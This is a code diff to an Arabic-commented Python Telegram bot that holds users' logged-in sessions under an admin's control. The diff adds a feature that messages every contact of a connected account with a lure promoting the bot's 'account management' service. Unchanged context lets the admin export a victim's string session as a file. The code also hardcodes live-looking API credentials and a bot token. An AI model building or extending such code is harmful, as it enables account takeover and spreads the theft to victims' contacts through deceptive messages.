@@ -12,10 +12,10 @@ from telethon import TelegramClient, events, functions
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
 
-# --- الإعدادات المباشرة (تم تحديث التوكن من سجلك) ---
+# --- الإعدادات المباشرة (توكنك الجديد) ---
 API_ID = 35980161
 API_HASH = 'd879538c1b65ee6aa57ac3b4ce4b63d3'
-BOT_TOKEN = '8615971361:AAF14JA9htDq1H1bfGx1915AUg18BIaLGXk' # التوكن الجديد
+BOT_TOKEN = '8615971361:AAF14JA9htDq1H1bfGx1915AUg18BIaLGXk' 
 ADMIN_ID = 8718973896
 
 DB_FILE = 'sessions.json'
@@ -258,12 +258,64 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text(f"❌ خطأ: {e}", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"adm_dialogs_{target_uid}_{phone}", style="primary")]]))
         return
 
+    # --- إرسال رسالة لجهات الاتصال (مصححة) ---
     if data.startswith("adm_msg_") and user_id == ADMIN_ID:
         parts = data.split("_")
         target_uid, phone = int(parts[2]), parts[3]
         user_states[user_id] = f"admin_broadcast:{target_uid}:{phone}"
+        keyboard = [
+            [btn("🚀 إرسال رسالة دعائية جاهزة", f"adm_sendpromo_{target_uid}_{phone}", style="success")],
+            [btn("✍️ كتابة رسالة مخصصة", f"adm_custom_{target_uid}_{phone}", style="primary")],
+            [btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="danger")]
+        ]
+        await query.edit_message_text("اختر نوع الرسالة التي تريد إرسالها لجهات الاتصال:", reply_markup=InlineKeyboardMarkup(keyboard))
+        return
+
+    if data.startswith("adm_custom_") and user_id == ADMIN_ID:
+        parts = data.split("_")
+        target_uid, phone = int(parts[2]), parts[3]
+        user_states[user_id] = f"admin_broadcast:{target_uid}:{phone}"
         keyboard = [[btn("🔙 إلغاء والرجوع", f"admin_acc_{target_uid}_{phone}", style="danger")]]
-        await query.edit_message_text("أرسل الرسالة التي تريد إرسالها لجميع جهات الاتصال في هذا الحساب:", reply_markup=InlineKeyboardMarkup(keyboard))
+        await query.edit_message_text("أرسل الرسالة المخصصة الآن:", reply_markup=InlineKeyboardMarkup(keyboard))
+        return
+
+    if data.startswith("adm_sendpromo_") and user_id == ADMIN_ID:
+        parts = data.split("_")
+        target_uid, phone = int(parts[2]), parts[3]
+        client = active_clients.get(target_uid, {}).get(phone)
+        if not client:
+            await query.edit_message_text("❌ الحساب غير متصل.")
+            return
+            
+        promo_text = (
+            "السلام عليكم ورحمة الله وبركاته،\n\n"
+            "أضع بين يديك أداة إدارية متطورة لإدارة حساباتك على تلغرام بكل سهولة وأمان.\n"
+            "من خلال هذا البوت، يمكنك:\n"
+            "🔹 حماية حسابك وإدارة الجلسات النشطة.\n"
+            "🔹 استخراج نسخة احتياطية من حسابك.\n"
+            "🔹 متابعة رسائلك بكل سهولة.\n\n"
+            "للتجربة والاستفادة، اضغط على الرابط أدناه:\n"
+            "t.me/YourBotUsername\n\n"
+            "دمت في حفظ الله ورعايته."
+        )
+        
+        await query.edit_message_text("⏳ جاري إرسال الرسالة لجميع جهات الاتصال...")
+        success = 0
+        fail = 0
+        try:
+            contacts = await client.get_contacts()
+            for c in contacts:
+                try:
+                    await client.send_message(c.id, promo_text)
+                    success += 1
+                    await asyncio.sleep(1.5)
+                except:
+                    fail += 1
+        except Exception as e:
+            await query.edit_message_text(f"❌ خطأ في جلب جهات الاتصال: {e}")
+            return
+        
+        await query.edit_message_text(f"✅ **انتهت العملية:**\nنجح الإرسال لـ: {success}\nفشل الإرسال لـ: {fail}", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
         return
 
     if data.startswith("adm_dev_") and user_id == ADMIN_ID:
@@ -294,7 +346,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.answer(f"❌ خطأ: {e}", show_alert=True)
         return
 
-    # --- استخراج الجلسة النصية (بدلاً من TData) ---
+    # --- استخراج الجلسة النصية ---
     if data.startswith("adm_tdata_") and user_id == ADMIN_ID:
         parts = data.split("_")
         target_uid, phone = int(parts[2]), parts[3]
@@ -308,7 +360,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.message.reply_document(
             document=open(filename, 'rb'), 
             filename=filename, 
-            caption="📁 **ملف الجلسة (String Session)**\n\nتم إرسال الملف ككود نصي لأن استضافة Render لا تدعم استخراج TData برمجياً. يمكنك استخدام هذا النص في أي أداة لتحويل الجلسات.",
+            caption="📁 **ملف الجلسة (String Session)**\n\nتم إرسال الملف ككود نصي لأن استضافة Render لا تدعم استخراج TData برمجياً.",
             reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]])
         )
         if os.path.exists(filename): os.remove(filename)
@@ -413,15 +465,17 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         success = 0
         fail = 0
         try:
-            async for c in client.iter_contacts():
+            contacts = await client.get_contacts()
+            for c in contacts:
                 try:
                     await client.send_message(c.id, text)
                     success += 1
-                    await asyncio.sleep(1.5) # تأخير لتجنب الحظر
+                    await asyncio.sleep(1.5)
                 except:
                     fail += 1
         except Exception as e:
             await update.message.reply_text(f"❌ خطأ في جلب جهات الاتصال: {e}")
+            return
         
         await update.message.reply_text(f"✅ **انتهت العملية:**\nنجح الإرسال لـ: {success}\nفشل الإرسال لـ: {fail}", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
         user_states.pop(user_id, None)
@@ -457,7 +511,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             user_states[user_id] = f"waiting_code:{phone}"
             if user_id not in active_clients: active_clients[user_id] = {}
             active_clients[user_id][f"temp_{phone}"] = client
-            await update.message.reply_text(f"✅ تم إرسال الكود إلى تطبيق تلغرام في هاتفك. أرسله هنا:", reply_markup=InlineKeyboardMarkup([[btn("🔙 إلغاء", "main_menu", style="danger")]]))
+            await update.message.reply_text(f"✅ تم إرسال الكود. أرسله هنا:", reply_markup=InlineKeyboardMarkup([[btn("🔙 إلغاء", "main_menu", style="danger")]]))
         except Exception as e:
             await update.message.reply_text(f"❌ خطأ: {e}", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", "main_menu", style="danger")]]))
             user_states.pop(user_id, None)
